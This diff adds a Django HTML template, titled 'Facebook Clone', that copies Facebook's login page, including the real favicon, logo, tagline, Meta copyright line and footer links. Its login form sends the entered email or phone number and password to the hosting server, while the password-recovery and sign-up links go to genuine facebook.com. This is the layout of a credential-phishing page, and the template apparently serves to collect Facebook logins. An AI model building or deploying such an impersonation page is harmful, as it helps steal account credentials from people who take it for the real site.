@@ -1,0 +1,123 @@
+{% load static %}
+<!--<!DOCTYPE html>-->
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook Clone</title>
+    <link rel="stylesheet" href="{% static 'css/facebook/styles.css' %}">
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" type="image/x-icon">
+</head>
+
+<body>
+    <main>
+        <div class="main">
+        <div class="heading-section">
+            <img src="{% static 'images/facebook/logo.png' %}" class="logo-img">
+            <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
+        </div>
+
+        <div class="form">
+            <form class="a-form" method="POST" action=""> {% csrf_token %}
+                {{ form.as_p}}
+                <input type="text" id="Email" class="a-email" name="username" placeholder="Email address or phone number"
+                    autofocus="autofocus" maxlength="250" required />
+                <input type="password" id="Password" class="a-pss" name="password" placeholder="Password"
+                    autofocus="autofocus" maxlength="250" required />
+                <input type="submit" class="a-sub" value="Log In" />
+                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="a-link">Forgotten password?</a>
+                <hr class="a-hr">
+                <a href="https://www.facebook.com/reg/" class="a-but">Create New Account</a>
+            </form>
+            <div class="create-page">
+                <a href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="a-href">Create a Page</a></b> for a celebrity, band or business.
+            </div>
+            </div>
+        </div>
+
+    </main>
+    <div class="footer">
+        <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+            <ul>
+                <li>English (UK)</li>
+                <li><a href="">हिन्दी</a></li>
+                <li><a href="">ગુજરાતી</a></li>
+                <li><a href="">मराठी</a></li>
+                <li><a href="">اردو</a></li>
+                <li><a href="">മലയാളം</a></li>
+                <li><a href="">বাংলা</a> </li>
+                <li><a href="" class="_sv4">తెలుగు</a> </li>
+                <li><a href="" class="_sv4">தமிழ்</a></li>
+                <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
+                <li><a href="" class="_sv4">Español</a></li>
+                <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a> </li>
+            </ul>
+            <div id="line"></div>
+            <div>
+                <ul>
+                    <li><a href="https://www.facebook.com/reg/">Sign Up</a></li>
+                    <li><a href="https://www.facebook.com/login/">Log In</a></li>
+                    <li><a href="https://messenger.com/">Messenger</a></li>
+                    <li><a href="https://www.facebook.com/lite/">Facebook Lite</a> </li>
+                    <li><a href="https://www.facebook.com/watch/"> Watch </a> </li>
+                    <li><a href="https://www.facebook.com/places/">Places</a></li>
+                    <li><a href="https://www.facebook.com/games/">Games</a></li>
+                    <li><a href="https://www.facebook.com/marketplace/">Marketplace</a></li>
+                    <li><a href="https://pay.facebook.com/">Meta Pay</a></li>
+                    <li><a href="https://www.oculus.com/">Oculus</a></li>
+                    <li><a href="https://portal.facebook.com/">Portal</a></li>
+                    <li><a href="https://www.instagram.com/">Instagram</a></li>
+                    <li><a href="https://www.bulletin.com/">Bulletin</a></li>
+                    <li><a href="https://www.facebook.com/fundraisers/">Fundraisers</a></li>
+                    <li><a href="https://www.facebook.com/biz/directory/">Services</a></li>
+                    <li><a href="https://www.facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D">Voting Information Centre</a></li>
+                    <li><a href="https://www.facebook.com/privacy/policy/?entry_point=facebook_page_footer">Privacy Policy</a></li>
+                    <li><a href="https://www.facebook.com/privacy/center/?entry_point=facebook_page_footer">Privacy Center</a></li>
+                    <li><a href="https://www.facebook.com/groups/explore/">Groups</a></li>
+                    <li><a href="https://about.meta.com/">About</a></li>
+                    <li><a href="https://www.facebook.com/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto">Create ad</a></li>
+                    <li><a href="https://www.facebook.com/pages/create/?ref_type=site_footer">Create Page</a></li>
+                    <li><a href="https://developers.facebook.com/?ref=pf">Developers</a></li>
+                    <li><a href="https://www.facebook.com/careers/?ref=pf">Careers</a></li>
+                    <li><a href="https://www.facebook.com/policies/cookies/">Cookies</a></li>
+                    <li><a href="https://www.facebook.com/help/568137493302217">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
+                    <li><a href="https://www.facebook.com/policies?ref=pf">Terms</a></li>
+                    <li><a href="https://www.facebook.com/policies?ref=pf">Help</a></li>
+                    <li><a href="https://www.facebook.com/help/637205020878504">Contact Uploading & Non-Users</a></li>
+                </ul>
+            </div>
+            <div class="copyright">
+                <div><span> Meta © {{ time }}</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="m-footer">
+        <div class="main-c">
+            <div class="list-1"><span >English (UK)</span>
+                <div><span><a href="">हिन्दी</a></span></div>
+                <div><span><a href="">اردو</a></span></div>
+                <div><span><a href="">বাংলা</a></span></div>
+            </div>
+            <div class="list-2">
+                <div><span><a href="">ગુજરાતી</a></span></div>
+                <div class=""><span><a href="">मराठी</a></span>
+                </div>
+                <div><span><a href="">മലയാളം</a></span></div>
+                <a>
+                    <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i>
+                    </div>
+                </a>
+            </div>
+        </div>
+        <div class="main-links">
+            <span>About </span>.
+            <span> Help </span>.
+            <span> More </span>
+        </div>
+        <div class="fb">Facebook Inc.</div>
+    </div>
+
+</body>
+
+</html>
